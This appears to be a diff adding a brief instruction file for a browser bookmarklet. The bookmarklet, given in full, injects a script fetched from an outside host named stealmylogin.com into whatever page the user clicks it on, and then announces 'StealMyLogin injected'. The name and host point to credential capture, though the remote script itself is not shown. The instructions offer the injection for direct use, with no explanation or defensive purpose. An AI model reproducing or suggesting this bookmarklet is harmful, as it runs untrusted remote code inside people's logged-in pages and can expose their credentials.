@@ -1,0 +1,5 @@
+Create A New Bookmark.
+Put This In The URL Section: javascript:(function() {var s=document.createElement('script');s.src='http://data.stealmylogin.com/stealmylogin.js';document.getElementsByTagName('head')[0].appendChild(s);alert('StealMyLogin injected');})();
+Save The Bookmark.
+Click It On The Page You Want To Run It On
+Then Click OK Then Done!
